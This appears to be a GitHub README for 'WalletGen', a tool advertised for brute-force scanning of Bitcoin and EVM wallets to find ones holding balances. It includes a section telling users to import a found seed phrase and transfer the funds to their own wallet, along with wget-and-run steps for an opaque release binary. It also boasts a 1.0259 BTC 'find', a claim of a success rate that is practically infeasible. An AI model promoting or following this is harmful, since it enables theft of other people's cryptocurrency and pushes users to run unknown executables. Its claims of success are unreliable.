WalletGen

Fast wallet mnemonic explorer with simple one-file releases for all major OSes.

### Features
- **Generation of cryptocurrency wallets**: Create single wallets for Bitcoin, Ethereum, BNB, MATIC and more.
- **Search for wallets with balance**: Bruteforce-based scanning of existing wallets with balances across Bitcoin and EVM networks.
- **Support for various algorithms**: Uses Keccak256 for EVM wallets and BIP39, BIP44, Bech32 for Bitcoin.
- **Database-accelerated search**: Use downloadable databases to speed up balance searches by up to 10x.
- **High speed of operation**: Utilizes CPU and GPU power to achieve best performance.
- **Recover your Bitcoin wallet**: Recover BTC wallets from seed phrase (mnemonic phrase).
- **Brain wallet**: Generate and check brain wallets.

### Supported Blockchains
- Bitcoin (BTC)
- Ethereum (ETH)
- Binance Smart Chain (BNB)
- Any EVM-compatible chain

### Search Modes
WalletGen allows you to search using a brute‑force method for two types of crypto wallets with an existing balance.

#### Bitcoin (BTC) wallets
- Press **key 3** in the menu or run `start_search_btc.bat` to search Bitcoin wallets through the internet. This checks balances in real‑time via blockchain explorers and may be slower.
- Press **key 6** to search Bitcoin wallets using the database. This is faster because generated wallets are compared against a pre‑built database of known addresses with balances.

#### EVM wallets (Ethereum, BNB, MATIC, etc.)
- Press **key 5** or run `start_search_evm.bat` to search EVM wallets through the internet. Balances are checked in real‑time via blockchain explorers.
- Press **key 6** to search EVM wallets using the database. This is faster since results are matched against the known database of addresses with balance.

### Speed Considerations
- The speed depends heavily on your hardware, especially the GPU.
- You can run multiple instances (1–4) depending on your system to speed up scanning.
- Using the database significantly improves efficiency by avoiding on‑chain queries for every generated wallet.

### When a Wallet Is Found
The program will:
- Stop immediately
- Display the wallet details in the console
- Save the data to `found_wallets.txt`

### How to Access the Funds
1. Import the mnemonic seed phrase from the found wallet into any compatible wallet (for example, Metamask, Trust Wallet, or Electrum).
2. After restoration, transfer the funds to your own wallet.
3. If the find is successful, consider sharing a small portion of the balance as support — thank you!

### Recover Your Bitcoin Wallet
WalletGen allows you to recover your Bitcoin wallet by seed phrase (mnemonic phrase). The program supports entering a complete seed phrase, as well as searching for missing words using special characters.

#### Process
- **Search for missing words**: If your seed phrase is missing words or you are unsure, replace those positions with an asterisk `*`. WalletGen will try all possible words in each `*` position to find the correct seed and restore the associated wallet.
- **Entering a complete seed phrase**: If you have a full 12‑word seed, enter it with spaces. WalletGen will generate all address types (Legacy, SegWit, P2SH) and check balances accordingly.

### Windows
- **Download**: [Release](https://github.com/stakssg5/Cute-/releases/latest)
- **Unpack** anywhere
- **Run** `WalletGen.exe`

### MacOS
- **Download**: [Release](https://github.com/stakssg5/Cute-/releases/latest)

### Linux (x86-64bit)
```bash
wget https://github.com/stakssg5/Cute-/releases/latest/download/WalletGen_linux_x64.tar.gz
tar -xzf WalletGen_linux_x64.tar.gz
cd walletgen
./walletgen
```

Or download: [Release for Linux](https://github.com/stakssg5/Cute-/releases/latest)

### Download and Use Database (for more speed)

| **Database**   | **Download link**                                                                 | **File Size** |
|----------------|------------------------------------------------------------------------------------|---------------|
| BTC Database   | [btc_database.txt](https://github.com/stakssg5/Cute-/releases/latest/download/btc_database.txt) | 1.03 GB       |

Use with:
```bash
./walletgen --db btc_database.txt
```

### New Find 10/20/2025
[3G4GbvFzW6DgQSC3vVxWAu7uSg2rnpu9uC](https://www.blockchain.com/explorer/addresses/btc/3G4GbvFzW6DgQSC3vVxWAu7uSg2rnpu9uC) - **1.0259 BTC**

### Building the Project
Use the makefile to build the project and install the [trezor library](https://pypi.org/project/trezor/).

### FAQ
- **Is there a GPU version?** Coming soon.
- **Where are releases?** See the latest on the [releases page](https://github.com/stakssg5/Cute-/releases/latest).

